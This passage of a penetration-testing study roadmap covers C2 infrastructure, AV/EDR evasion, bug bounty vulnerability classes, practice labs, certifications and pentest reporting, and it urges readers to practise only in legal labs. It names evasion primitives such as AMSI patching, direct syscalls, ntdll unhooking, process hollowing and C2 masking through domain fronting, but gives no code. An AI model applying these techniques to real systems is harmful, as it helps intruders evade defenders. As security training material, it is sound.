## Phase 9: Red Teaming, C2 Infrastructure & EDR/AV Evasion

Red Teaming tests an organization's detection and response capabilities (Blue Team / SOC) by simulating advanced persistent threats (APTs).

### 1. Command & Control (C2) Architectures
- **Modern C2 Frameworks**:
  - Open Source: **Sliver** (Bishop Fox - Go), **Mythic** (SpecterOps), **Havoc**, **Covenant** (.NET).
  - Commercial / Enterprise: **Cobalt Strike**, **Brute Ratel (BRc4)**.
- **Redirectors & Resilient Infrastructure**:
  - Placing Apache / NGINX reverse proxies (redirectors) in front of the teamserver.
  - Domain Fronting & CDN routing (Cloudflare Workers) to mask real C2 IP.
  - DNS-based C2 channels (tunneling data inside DNS TXT queries).

### 2. Antivirus & EDR Evasion Mechanics
- **How EDRs Detect Malicious Code**:
  - Signature matching (YARA rules).
  - **API Hooking**: EDR places `JMP` instructions inside user-mode DLLs (`ntdll.dll`, `kernel32.dll`) to intercept and inspect Win32 APIs before execution.
  - **AMSI (Antimalware Scan Interface)**: Inspects scripts (PowerShell, VBScript, C# assemblies) in memory before execution.
  - **Event Tracing for Windows (ETW)**: Kernel-level logging of process creation, memory allocation, and thread injection.
- **Evasion Primitives**:
  - **AMSI Patching**: Overwriting `AmsiScanBuffer` in memory with an assembly stub returning `S_OK` (0).
  - **Direct System Calls (Syscalls)**:
    - Bypassing user-mode hooks entirely by invoking kernel system call instructions (`syscall` / `sysenter`) directly without going through `ntdll.dll`.
    - Tools: `SysWhispers3`, `Hell's Gate`, `Halo's Gate`, `Tartarus' Gate`.
  - **DLL Unhooking**:
    - Mapping a clean, untouched copy of `ntdll.dll` directly from disk (`\KnownDlls\ntdll.dll`) and overwriting the hooked `.text` section in memory.
  - **Process Injection Techniques**:
    - Process Hollowing (creating suspended process, unmapping code, writing payload, resuming).
    - Early Bird APC Queue Injection.
    - Thread Hijacking.
  - **Payload Obfuscation & Encryption**:
    - AES/RC4 encrypted shellcode stubs decrypted dynamically only at execution.
    - Sleep Obfuscation (Ekko, Foliage) to encrypt payload in memory during sleep cycles, defeating memory scanners.

---

## Phase 10: Bug Bounty Hunting Methodology & High-Payout Targets

Bug bounty hunting tests specialized, high-impact vulnerabilities on public targets (HackerOne, Bugcrowd, Intigriti).

### 1. High-ROI Vulnerability Classes
- **Business Logic Flaws**: Flaws automated scanners will never find. Modifying shopping cart prices, negative quantity ordering, coupon code race conditions.
- **Race Conditions**: Parallel request submission using Turbo Intruder to claim single-use gift cards or bypass balance checks multiple times.
- **HTTP Request Smuggling (HRS)**:
  - Discrepancies between front-end reverse proxy and backend server in interpreting `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE).
  - Types: CL.TE, TE.CL, TE.TE.
  - High impact: Cache poisoning, credential hijacking, request rewriting.
- **CORS Misconfiguration**: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` permitting third-party sites to steal sensitive data via XHR.
- **Subdomain Takeovers**: Dangling DNS CNAME records pointing to decommissioned GitHub Pages, AWS S3 buckets, Heroku, or Zendesk instances.

### 2. Hunting Automation Pipeline
- Continuous asset discovery using cron jobs:
  - Amass / Subfinder -> httpx -> Nuclei (custom security templates).
  - Change detection: Monitoring new subdomains and alerting via Discord/Slack webhooks using `notify`.

---

## Phase 11: Professional Lab Progression (Zero to Hero)

Do not practice on real targets. Build your muscle memory in legal, simulated environments.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        LAB PROGRESSION PATHWAY                         │
│                                                                        │
│   [Beginner]                                                           │
│   ├── OverTheWire (Bandit: Linux CLI mastery)                          │
│   ├── TryHackMe: Complete Beginner Pathway                             │
│   └── TryHackMe: Jr Penetration Tester Pathway                         │
│                                                                        │
│   [Intermediate - Web & Network]                                      │
│   ├── PortSwigger Web Security Academy (AppSec Gold Standard)          │
│   ├── TryHackMe: Offensive Pentesting Pathway                          │
│   └── Hack The Box: Starting Point & Easy Linux/Windows Machines       │
│                                                                        │
│   [Advanced - Infrastructure & AD]                                     │
│   ├── Hack The Box: Active Directory ProLabs (Dante, Zephyr)           │
│   ├── Game of Active Directory (GOAD - Free Local Multi-Domain Lab)    │
│   └── OffSec Proving Grounds Practice                                  │
│                                                                        │
│   [Expert - Exploit Dev & Red Team]                                    │
│   ├── Hack The Box: Offshore / RastaLabs ProLabs                       │
│   ├── Exploit Education (Protostar, Phoenix)                           │
│   └── Certified Red Team Professional (CRTP) Lab                       │
└────────────────────────────────────────────────────────────────────────┘
```

### Free Self-Hosted Active Directory Lab (GOAD)
- **GOAD (Game of Active Directory)** by Mayfly:
  - 5 virtual machines simulating realistic corporate AD architecture (Parent/Child domain, trusts, vulnerable templates, MSSQL integrations).
  - Deploys automatically via Vagrant and VirtualBox/VMware/Proxmox.

---

## Phase 12: Industry Certification Matrix & Career Trajectory

Certifications validate hands-on capability to employers and clients.

| Level | Track | Recommended Certifications | Exam Format | Key Focus |
| :--- | :--- | :--- | :--- | :--- |
| **Foundational** | General Security | **CompTIA Security+**, **eJPT** (eLearnSecurity Junior Pentester) | Practical / MCQs | Networking, basic tools, scanning, entry exploit |
| **Professional** | Penetration Testing | **OSCP** (OffSec Certified Professional), **HTB CPTS** (Certified Penetration Testing Specialist) | 24-hr hands-on practical exam | Initial foothold, Linux/Windows privesc, AD compromise |
| **Specialist** | Web Application Security | **PortSwigger BSCP** (Burp Suite Certified Practitioner), **OSWE** (OffSec Web Expert) | 48-hr practical / White-box code review | Custom exploit chaining, deserialization, source code audit |
| **Advanced** | Active Directory & Red Team | **CRTP** (Certified Red Team Professional), **CRTE** (Red Team Expert), **OSEP** (OffSec Experienced Pentester) | Multi-day red team hands-on | AD forest trusts, AMSI/AV bypass, lateral movement |
| **Elite** | Exploit Development | **OSED** (OffSec Exploit Developer), **OSCE3** (OffSec Certified Expert 3) | 48-hr custom exploit writing | ROP chains, custom shellcode, DEP/ASLR bypass, reverse engineering |

---

## Phase 13: Professional Reporting, Remediation & Executive Communication

A penetration tester's ultimate deliverable is not the shell; it is the **Penetration Testing Report**. Clients pay for actionable risk reduction.

### Structure of a Commercial Pentest Report
1. **Executive Summary**:
   - Written for CISOs, CEOs, and Board of Directors.
   - Non-technical business impact: Financial risk, regulatory compliance (GDPR, PCI-DSS, HIPAA), operational disruption risk.
   - Overall Security Posture Rating (High/Medium/Low).
2. **Assessment Scope & Methodology**:
   - Dates of assessment, targets tested, rules of engagement followed (PTES / OWASP WSTG).
3. **Vulnerability Summary Matrix**:
   - Categorized by Severity (Critical, High, Medium, Low, Informational).
   - Standardized CVSS v3.1/v4.0 scores.
4. **Detailed Technical Findings (Per Vulnerability)**:
   - **Title**: e.g., *Remote Code Execution via Insecure Deserialization in Admin API*.
   - **Severity & CVSS Vector**: e.g., `Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H - 9.8)`.
   - **Vulnerable Component / URL**: Specific endpoint and parameter.
   - **Technical Description**: Explanation of root cause.
   - **Step-by-Step Proof of Concept (PoC)**: Exact HTTP requests/responses, screenshots, and reproducible code so the dev team can recreate it immediately.
   - **Business Impact**: What an attacker could achieve.
   - **Specific Remediation Recommendations**: Concrete code snippets or configuration changes (not generic "update software").
   - **References**: CVE, CWE, OWASP links.

---

## Daily / Weekly Mastery Study Routine

- **Monday - Wednesday (Theory & Labs)**: Spend 2 hours daily studying one phase concept and solving 1 PortSwigger Academy lab or 1 Hack The Box machine.
- **Thursday (Exploit Deep Dive)**: Read 1 recent CVE analysis or write-up on zero-day / bug bounty report (e.g., HackerOne Hacktivity).
- **Friday (Scripting / Tool Building)**: Write or refactor a custom script in Python or PowerShell that automates a task from this week's labs.
- **Saturday / Sunday (Full Immersion)**: Dedicate 4–6 hours to an active CTF, ProLab (Dante / Zephyr), or an end-to-end unguided box. Document everything in your personal knowledge base!
